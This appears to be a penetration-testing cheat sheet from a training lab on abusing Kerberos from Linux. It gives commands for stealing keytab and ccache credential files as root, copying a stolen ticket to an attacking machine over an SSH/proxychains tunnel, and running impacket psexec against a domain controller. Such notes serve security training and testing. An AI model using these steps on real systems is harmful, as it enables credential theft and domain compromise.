# Kerberos on Linux

## Basic commands

View current Kerberos tickets
```
klist
env | grep KRB5CCNAME
```

Request / refresh Kerberos ticket
```
kinit
kinit -R
```
Purge current ticket
```
kdestroy
```

Request service ticket
```
kvno MSSQLSvc/DC01.corp1.com:1433 && klist
```

## Stealing Keytab Files

Using Keytab Files for Automated Kerberos Authentication
Keytab files store Kerberos principal names and encrypted keys, allowing automated scripts to authenticate to Kerberos-enabled resources without requiring a password. This is useful for scenarios like accessing a Kerberos-secured MSSQL database through a script.

Keytab files are often used in cron jobs or scheduled scripts that need to access network resources on behalf of a user. By examining the /etc/crontab file, we can identify scripts that may utilize keytabs for authentication and see which users are associated with them.

To create a keytab file for a user, use the ktutil command:

```
ktutil
addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
wkt /tmp/administrator.keytab
quit
```
- `addent:` Adds an entry for the specified principal (administrator@CORP1.COM) with the specified encryption type (rc4-hmac).
- `wkt:` Writes the keytab to the specified path (/tmp/administrator.keytab).

When working as a root level user it is possible to read these keytab files in order to obtain a Kerberos ticket for the specified user within the keytab file.

```
root@linuxvictim:~# klist
klist: No credentials cache found (filename: /tmp/krb5cc_0)

root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
root@linuxvictim:~# klist

Ticket cache: FILE:/tmp/krb5cc_0
Default principal: administrator@CORP1.COM

Valid starting       Expires              Service principal
10/04/2024 02:45:50  10/04/2024 12:45:50  krbtgt/CORP1.COM@CORP1.COM
        renew until 10/11/2024 02:45:50
```

Verify if ticket authentication is successful
```
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
```

## Attacking Using Credential Cache Files

Typically users ccache files are stored in `/tmp/krb5cc_*`. Usually the file is only readable by the owner / creator of the file. However, if we have root level access or privileged read / write to a users ccache file this can be abused to gain access to the Kerberos credential material.

```
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
ls -al /tmp/krb5cc_minenow
```

Import ticket into current session:
```bash
kdestroy
export KRB5CCNAME=/tmp/krb5cc_minenow
klist

# Validate
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
```
## Using Kerberos from Linux over proxychains

In the event we have captured Kerberos credentials on an intermediary host, we can export the ccache back to our Kali machine, create a SSH tunnel and use the ccache locally over proxychains against a target network.

Proxychains config:
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
Forward port 9050 to the intermediary host with SSH
```
ssh offsec@192.168.234.45 -D 9050
```
Copy ccache ticket from intermdiary host to attacking system
```
scp offsec@192.168.234.45:/tmp/krb5cc_minenow /tmp/krb5cc_minenow  
```

Export the ccache to our environment on the attacking system
```
export KRB5CCNAME=/tmp/krb5cc_minenow 
```
Then confirm with Proxychains we can perform domain actions
```python
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.234.5 CORP1.COM/Administrator

proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass

```
## Convert ccache files to Kirbi format
If required. ccache files can be converted to Kirbi format for use with Mimikatz or Rubeus (after Base64) encoding
```
python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py krb5cc_myccache out.kirbi
```
